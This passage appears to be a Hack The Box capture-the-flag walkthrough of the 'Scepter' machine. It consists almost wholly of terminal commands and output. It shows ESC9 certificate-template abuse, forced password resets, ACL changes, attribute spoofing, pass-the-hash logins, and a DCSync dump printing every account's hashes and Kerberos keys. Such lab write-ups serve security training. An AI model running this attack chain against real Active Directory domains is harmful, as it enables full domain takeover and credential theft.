      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

```terminal
/home/kali/Documents/htb/machines/scepter:-$ nxc ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --query "(sAMAccountName=h.brown)" "samaccountname altSecurityIdentities memberOf"
LDAP        10.10.11.65     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb)
LDAP        10.10.11.65     389    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce 
LDAP        10.10.11.65     389    DC01             [+] Response for object: CN=h.brown,CN=Users,DC=scepter,DC=htb
LDAP        10.10.11.65     389    DC01             memberOf             CN=CMS,CN=Users,DC=scepter,DC=htb
LDAP        10.10.11.65     389    DC01                                  CN=Helpdesk Admins,CN=Users,DC=scepter,DC=htb
LDAP        10.10.11.65     389    DC01                                  CN=Protected Users,CN=Users,DC=scepter,DC=htb
LDAP        10.10.11.65     389    DC01                                  CN=Remote Management Users,CN=Builtin,DC=scepter,DC=htb
LDAP        10.10.11.65     389    DC01             sAMAccountName       h.brown
LDAP        10.10.11.65     389    DC01             altSecurityIdentities X509:<RFC822>h.brown@scepter.htb
```

---

```terminal
/home/kali/Documents/htb/machines/scepter:-$ bloodyAD --username 'd.baker' --password "aad3b435b51404eeaad3b435b51404ee":"18b5fb0d99e7a475316213c15b6f22ce" -d scepter.htb --host 10.10.11.65 set password "a.carter" "newP@ssword2022"
[+] Password changed successfully!

/home/kali/Documents/htb/machines/scepter:-$ sudo nxc smb scepter.htb -u a.carter -p 'newP@ssword2022'
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.65     445    DC01             [+] scepter.htb\a.carter:newP@ssword2022
```

```terminal
/home/kali/Documents/htb/machines/scepter:-$ bloodyAD -u a.carter -p newP@ssword2022 -d scepter.htb --host dc01.scepter.htb add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
```

---

```terminal
/home/kali/Documents/htb/machines/scepter:-$ bloodyAD -u a.carter -p newP@ssword2022 -d scepter.htb --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb
[+] d.baker's mail has been updated
```

```terminal
/home/kali/Documents/htb/machines/scepter:-$ certipy req -u 'd.baker@scepter.htb' -hashes '18b5fb0d99e7a475316213c15b6f22ce' -target '10.10.11.65' -ca 'scepter-dc01-ca' -template 'staffaccesscertificate' -upn 'h.brown@scepter.htb' -dns 'dc01.scepter.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: SCEPTER.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'd.baker.pfx'
[*] Wrote certificate and private key to 'd.baker.pfx'
```

```terminal
/home/kali/Documents/htb/machines/scepter:-$ certipy auth -pfx d.baker.pfx -username h.brown -dc-ip 10.10.11.65 -domain scepter.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'h.brown@scepter.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'h.brown.ccache'
[*] Wrote credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
```

```terminal
/home/kali/Documents/htb/machines/scepter:-$ export KRB5CCNAME=h.brown.ccache
/home/kali/Documents/htb/machines/scepter:-$ nxc smb 10.10.11.65 -u '' -p '' --generate-krb5-file SCEPTER.HTB
/home/kali/Documents/htb/machines/scepter:-$ export KRB5_CONFIG=$(pwd)/SCEPTER.HTB
```

```terminal
/home/kali/Documents/htb/machines/scepter:-$ evil-winrm -i dc01.scepter.htb -r SCEPTER.HTB -H '4ecf5242092c6fb8c360a08069c75a0c'

*Evil-WinRM* PS C:\Users\h.brown\Documents> whoami
scepter\h.brown

*Evil-WinRM* PS C:\Users\h.brown\Documents> type ..\Desktop\user.txt
```

---
## Privilege Escalation

```powershell
*Evil-WinRM* PS C:\Users\h.brown\Documents> net user
User accounts for \\

-------------------------------------------------------------------------------
a.carter                 Administrator            d.baker
e.lewis                  Guest                    h.brown
krbtgt                   M.clark                  o.scott
p.adams
```

```powershell
*Evil-WinRM* PS C:\Users\h.brown\Documents> upload SharpHound.exe
Info: Upload successful!
*Evil-WinRM* PS C:\Users\h.brown\Documents> upload winPEASx64.exe
Info: Upload successful!


*Evil-WinRM* PS C:\Users\h.brown\Documents> .\SharpHound.exe -c all
*Evil-WinRM* PS C:\Users\h.brown\Documents> .\winPEASx64.exe > peas.txt

*Evil-WinRM* PS C:\Users\h.brown\Documents> download 20250731184349_BloodHound.zip
Info: Download successful!
*Evil-WinRM* PS C:\Users\h.brown\Documents> download peas.txt
Info: Download successful!
```

```
/home/kali/Documents/htb/machines/scepter:-$ bloodyAD --host dc01.scepter.htb -d scepter.htb -k get writable --detail
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htb

url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
thumbnailPhoto: WRITE
```


```terminal
/home/kali/Documents/htb/machines/scepter:-$ bloodyAD --host DC01.scepter.htb -d scepter.htb -k set object p.adams altSecurityIdentities -v 'X509:<RFC822>p.adams@scepter.htb'
[+] p.adams's altSecurityIdentities has been updated                                                                                      
/home/kali/Documents/htb/machines/scepter:-$ bloodyAD --host DC01.scepter.htb -d scepter.htb -k get object p.adams --attr altSecurityIdentities
distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
altSecurityIdentities: X509:<RFC822>p.adams@scepter.htb

/home/kali/Documents/htb/machines/scepter:-$ bloodyAD -d scepter.htb -u a.carter -p 'newP@ssword2022' --host dc01.scepter.htb --dc-ip 10.10.11.65 add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" d.baker
[+] d.baker has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB

/home/kali/Documents/htb/machines/scepter:-$ bloodyAD -u d.baker -p ':18b5fb0d99e7a475316213c15b6f22ce' --host 10.10.11.65 -d scepter.htb set object d.baker mail -v p.adams@scepter.htb
[+] d.baker's mail has been updated

/home/kali/Documents/htb/machines/scepter:-$ certipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'd.baker.pfx'
[*] Wrote certificate and private key to 'd.baker.pfx'

/home/kali/Documents/htb/machines/scepter:-$ certipy auth -pfx d.baker.pfx -username p.adams -dc-ip 10.10.11.65 -domain scepter.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'p.adams@scepter.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'p.adams.ccache'
[*] Wrote credential cache to 'p.adams.ccache'
[*] Trying to retrieve NT hash for 'p.adams'
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0

/home/kali/Documents/htb/machines/scepter:-$ nxc smb dc01.scepter.htb -u p.adams -H 1b925c524f447bb821a8789c4b118ce0
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.65     445    DC01             [+] scepter.htb\p.adams:1b925c524f447bb821a8789c4b118ce0
```


```terminal
/home/kali/Documents/htb/machines/scepter:-$ secretsdump.py scepter.htb/p.adams@DC01.scepter.htb -hashes :1b925c524f447bb821a8789c4b118ce0
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
scepter.htb\d.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::
scepter.htb\a.carter:1107:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
scepter.htb\h.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::
scepter.htb\p.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::
scepter.htb\e.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::
scepter.htb\o.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::
scepter.htb\M.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cc5d676d45f8287aef2f1abcd65213d9575c86c54c9b1977935983e28348bcd5
Administrator:aes128-cts-hmac-sha1-96:bb557b22bad08c219ce7425f2fe0b70c
Administrator:des-cbc-md5:f79d45bf688aa238
krbtgt:aes256-cts-hmac-sha1-96:5d62c1b68af2bb009bb4875327edd5e4065ef2bf08e38c4ea0e609406d6279ee
krbtgt:aes128-cts-hmac-sha1-96:b9bc4dc299fe99a4e086bbf2110ad676
krbtgt:des-cbc-md5:57f8ef4f4c7f6245
scepter.htb\d.baker:aes256-cts-hmac-sha1-96:6adbc9de0cb3fb631434e513b1b282970fdc3ca089181991fb7036a05c6212fb
scepter.htb\d.baker:aes128-cts-hmac-sha1-96:eb3e28d1b99120b4f642419c99a7ac19
scepter.htb\d.baker:des-cbc-md5:2fce8a3426c8c2c1
scepter.htb\a.carter:aes256-cts-hmac-sha1-96:aa2dc3cca04565e24d311c424d36910bf3b6431f1a481cf20ae380f99d4bcfc2
scepter.htb\a.carter:aes128-cts-hmac-sha1-96:8182775fa628b052e4afe54be17ad4c0
scepter.htb\a.carter:des-cbc-md5:ec45e0613daea4df
scepter.htb\h.brown:aes256-cts-hmac-sha1-96:5779e2a207a7c94d20be1a105bed84e3b691a5f2890a7775d8f036741dadbc02
scepter.htb\h.brown:aes128-cts-hmac-sha1-96:1345228e68dce06f6109d4d64409007d
scepter.htb\h.brown:des-cbc-md5:6e6dd30151cb58c7
scepter.htb\p.adams:aes256-cts-hmac-sha1-96:0fa360ee62cb0e7ba851fce9fd982382c049ba3b6224cceb2abd2628c310c22f
scepter.htb\p.adams:aes128-cts-hmac-sha1-96:85462bdef70af52770b2260963e7b39f
scepter.htb\p.adams:des-cbc-md5:f7a26e794949fd61
scepter.htb\e.lewis:aes256-cts-hmac-sha1-96:1cfd55c20eadbaf4b8183c302a55c459a2235b88540ccd75419d430e049a4a2b
scepter.htb\e.lewis:aes128-cts-hmac-sha1-96:a8641db596e1d26b6a6943fc7a9e4bea
scepter.htb\e.lewis:des-cbc-md5:57e9291aad91fe7f
scepter.htb\o.scott:aes256-cts-hmac-sha1-96:4fe8037a8176334ebce849d546e826a1248c01e9da42bcbd13031b28ddf26f25
scepter.htb\o.scott:aes128-cts-hmac-sha1-96:37f1bd1cb49c4923da5fc82b347a25eb
scepter.htb\o.scott:des-cbc-md5:e329e37fda6e0df7
scepter.htb\M.clark:aes256-cts-hmac-sha1-96:a0890aa7efc9a1a14f67158292a18ff4ca139d674065e0e4417c90e5a878ebe0
scepter.htb\M.clark:aes128-cts-hmac-sha1-96:84993bbad33c139287239015be840598
scepter.htb\M.clark:des-cbc-md5:4c7f5dfbdcadba94
DC01$:aes256-cts-hmac-sha1-96:4da645efa2717daf52672afe81afb3dc8952aad72fc96de3a9feff0d6cce71e1
DC01$:aes128-cts-hmac-sha1-96:a9f8923d526f6437f5ed343efab8f77a
DC01$:des-cbc-md5:d6923e61a83d51ef
```

```terminal
/home/kali/Documents/htb/machines/scepter:-$ evil-winrm -i dc01.scepter.htb -u Administrator -H 'a291ead3493f9773dc615e66c2ea21c4'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
scepter\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
```


